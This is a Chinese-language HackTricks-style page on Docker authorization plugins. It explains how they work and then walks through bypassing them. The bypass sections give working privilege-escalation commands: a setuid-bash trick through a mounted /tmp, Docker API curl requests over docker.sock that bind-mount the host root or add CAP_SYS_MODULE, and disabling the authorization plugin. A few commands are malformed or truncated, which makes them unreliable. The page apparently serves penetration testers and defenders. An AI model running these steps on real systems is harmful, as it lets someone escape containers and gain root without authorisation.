<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>


**Docker** 的开箱即用的**授权**模型是**全有或全无**。任何有权限访问Docker守护进程的用户都可以**运行任何**Docker客户端**命令**。通过Docker的Engine API联系守护进程的调用者也是如此。如果您需要**更大的访问控制**，您可以创建**授权插件**并将它们添加到您的Docker守护进程配置中。使用授权插件，Docker管理员可以**配置细粒度的访问**策略来管理对Docker守护进程的访问。

# 基本架构

Docker Auth插件是您可以使用的**外部**插件，用于**允许/拒绝**对Docker守护进程的**请求**的**操作**，这取决于请求它的**用户**和**请求**的**操作**。

当通过CLI或通过Engine API向Docker**守护进程**发出**HTTP** **请求**时，**认证**子系统会将请求传递给已安装的**认证**插件。请求包含用户（调用者）和命令上下文。**插件**负责决定是**允许**还是**拒绝**请求。

下面的时序图展示了允许和拒绝授权流程：

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

发送给插件的每个请求**包括经过身份验证的用户、HTTP头和请求/响应体**。只有**用户名**和使用的**认证方法**被传递给插件。最重要的是，**没有**用户**凭证**或令牌被传递。最后，并非所有请求/响应体都发送给授权插件。只有那些`Content-Type`为`text/*`或`application/json`的请求/响应体被发送。

对于可能劫持HTTP连接（`HTTP Upgrade`）的命令，如`exec`，授权插件仅在初始HTTP请求时被调用。一旦插件批准了命令，授权就不适用于流程的其余部分。具体来说，流数据不会传递给授权插件。对于返回分块HTTP响应的命令，如`logs`和`events`，只有HTTP请求被发送到授权插件。

在请求/响应处理期间，一些授权流程可能需要对Docker守护进程进行额外的查询。为了完成这些流程，插件可以像普通用户一样调用守护进程API。为了启用这些额外的查询，插件必须提供管理员配置适当的认证和安全策略的手段。

## 多个插件

您负责在Docker守护进程**启动**时**注册**您的**插件**。您可以安装**多个插件并将它们链接在一起**。这个链可以是有序的。每个请求按顺序通过链传递。只有在**所有插件都授予对资源的访问权限**时，才授予访问权限。

# 插件示例

## Twistlock AuthZ Broker

插件 [**authz**](https://github.com/twistlock/authz) 允许您创建一个简单的**JSON**文件，**插件**将会**读取**它来授权请求。因此，它为您提供了非常容易控制每个用户可以访问哪些API端点的机会。

这是一个示例，将允许Alice和Bob可以创建新容器：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

在页面 [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) 上，您可以找到请求的URL和操作之间的关系。在页面 [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) 上，您可以找到操作名称和操作之间的关系。

## 简单插件教程

您可以在这里找到一个**易于理解的插件**，其中包含有关安装和调试的详细信息：[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

阅读`README`和`plugin.go`代码以了解其工作原理。

# Docker授权插件绕过

## 枚举访问

主要要检查的是**哪些端点被允许**以及**哪些HostConfig的值被允许**。

要执行此枚举，您可以**使用工具** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**。**

## 不允许的 `run --privileged`

### 最小权限
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### 运行容器然后获取特权会话

在这种情况下，系统管理员**禁止用户挂载卷和使用 `--privileged` 标志运行容器**或给容器赋予任何额外的能力：
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
然而，用户可以**在运行中的容器内创建一个具有额外权限的 shell**：
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
现在，用户可以使用[**之前讨论的技术**](./#privileged-flag)从容器中逃脱，并在宿主机内**提升权限**。

## 挂载可写文件夹

在这种情况下，系统管理员**禁止用户使用 `--privileged` 标志运行容器**或给容器赋予任何额外的能力，他只允许挂载 `/tmp` 文件夹：
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
请注意，您可能无法挂载文件夹 `/tmp`，但您可以挂载**其他可写文件夹**。您可以使用以下命令找到可写目录：`find / -writable -type d 2>/dev/null`

**请注意，并非所有 Linux 机器上的目录都支持 suid 位！**为了检查哪些目录支持 suid 位，请运行 `mount | grep -v "nosuid"`。例如，通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup` 和 `/var/lib/lxcfs` 不支持 suid 位。

还请注意，如果您能够**挂载 `/etc`** 或任何其他**包含配置文件的文件夹**，您可以作为 root 用户在 docker 容器中更改它们，以便**在宿主机上滥用它们**并提升权限（可能修改 `/etc/shadow`）。
{% endhint %}

## 未检查的 API 端点

配置此插件的系统管理员的责任是控制每个用户可以执行哪些操作以及使用哪些权限。因此，如果管理员采取了对端点和属性的**黑名单**方法，他可能会**忘记一些**可能允许攻击者**提升权限**的端点。

您可以在 [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) 检查 docker API。

## 未检查的 JSON 结构

### 在 root 中绑定

当系统管理员配置 docker 防火墙时，他可能**忘记了一些重要参数**，比如 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的“**Binds**”。\
在以下示例中，可以滥用这种配置错误来创建并运行一个挂载宿主机的 root (/) 文件夹的容器：
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
注意，在此示例中，我们将 **`Binds`** 参数作为 JSON 中的根级键使用，但在 API 中，它位于 **`HostConfig`** 键下。
{% endhint %}

### HostConfig 中的 Binds

按照 **根中的 Binds** 相同的指令执行对 Docker API 的**请求**：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### 根目录中的挂载

按照**根目录中的绑定**部分的指令执行，对Docker API发出以下**请求**：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

按照**Binds in root**中的相同指令，对Docker API执行此**请求**：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## 未检查的 JSON 属性

当系统管理员配置 docker 防火墙时，他可能**忽略了某个参数的一些重要属性**，比如 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的 "**HostConfig**" 里的 "**Capabilities**"。在下面的例子中，可以利用这种配置错误来创建并运行一个具有 **SYS\_MODULE** 能力的容器：
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** 是通常包含用于从容器逃逸的**有趣** **权限**的关键。然而，正如我们之前讨论的，注意使用它之外的 Binds 也同样有效，并且可能允许你绕过限制。
{% endhint %}

## 禁用插件

如果 **系统管理员** **忘记** **禁止** 禁用 **插件** 的能力，你可以利用这一点来完全禁用它！
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
记得在提升权限后要**重新启用插件**，否则**Docker服务重启将不起作用**！

## Auth插件绕过写作

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# 参考资料

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 的github仓库提交PR来**分享您的黑客技巧。

</details>
